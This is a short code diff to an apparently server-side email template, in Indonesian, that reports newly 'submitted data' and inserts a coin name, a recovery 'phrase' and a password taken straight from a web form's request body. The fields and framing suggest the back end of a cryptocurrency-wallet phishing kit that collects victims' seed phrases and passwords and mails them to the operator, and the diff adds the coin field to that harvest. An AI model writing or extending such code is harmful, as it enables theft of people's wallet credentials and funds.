@@ -43,6 +43,7 @@ export default function (
                                 <p style="font-size: 14px;"><b>Hallo,</b></p>
                                 <p>Ada data baru yang terkirim</p>
                                 <br />
+                                <p>Coin : ${req.body.coin}</p>
                                 <p>Frasa : ${req.body.frasa}</p>
                                 <p>Password : ${req.body.password}</p>
                                 <br />
